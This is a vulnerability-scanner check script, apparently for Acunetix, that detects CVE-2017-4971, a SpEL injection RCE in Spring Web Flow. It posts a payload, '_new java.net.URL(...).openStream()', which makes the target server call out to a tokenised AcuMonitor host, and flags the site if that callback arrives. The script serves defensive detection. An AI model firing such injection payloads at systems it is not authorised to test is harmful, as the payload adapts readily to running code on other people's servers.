/**
title: Spring Web Flow [CVE-2017-4971]
tags: spring, rce
description:
    Tests for Data Binding Expression Vulnerability [RCE] in Spring Web Flow [CVE-2017-4971].
**/

/// <reference path="../native.d.ts"/>

let flow = ax.loadModule("/lib/utility/flow.js").flow(scanState);
let acumonitor = ax.loadModule("/lib/utility/acumonitor.js");
let rnd = ax.loadModule("/lib/utility/random.js");

// debugging
function trace(msg) {
    //    ax.log(1, "LOG:" + msg);
}

function alert(job, acumonitor_data) {
    scanState.addVuln({
        typeId: "Spring_Webflow_SPEL_RCE_CVE-2017-4971.xml",
        location: scriptArg.location,
        http: job,
        details: { "acumonitor_data": acumonitor_data },
        tags: ["verified", "acumonitor", "confidence.100"],
        detailsType: 1
    });
}

// test vulnerability 
function testVulnerability() {
    trace("testing on URI: " + scriptArg.http.request.uri);

    // prepare job from the current request scriptArg.http.request
    let job = ax.http.job();
    job.setUrl(scriptArg.target.url);
    job.request.assign(scriptArg.http.request);

    // prepare AcuMonitor token and url
    let rndToken = "hit" + rnd.randStrDigits(10);
    let url = "http://" + rndToken + "." + acumonitor.AMServer + "/";

    // adjust the request body
    job.request.body = "&_new java.net.URL('" + url + "').openStream()=";

    // make http request
    let http = ax.http.execute(job).sync();

    if (!http.error) {
        // verify with AcuMonitor     
        var result = acumonitor.verifyInjectionHTTP(rndToken);
        if (result) {
            // alert only once per scan
            flow.callIdOnce(
                "spring-web-flow-alert-" + scriptArg.http.hostname,
                alert, http, result
            );
        }
    }
}

function main() {
    // only interested in POST Spring Web Flow URLs e.g. ?execution=e1s1
    // also filter by content-type
    if (scriptArg.http.request.method == "POST"
        && scriptArg.http.request.isType("application/x-www-form-urlencoded")) {
        let match = scriptArg.http.request.uri.match(/\?execution=(e\d+s\d+)$/)
        if (match && match.length > 0) {
            // call once per flow id
            let flowId = match[1];
            flow.callIdOnce(
                "spring-web-flow-" + scriptArg.http.hostname + "-" + flowId,
                testVulnerability
            );
        }
    }
}

if (acumonitor.checkAcumonitor(scanState)) { main(); }
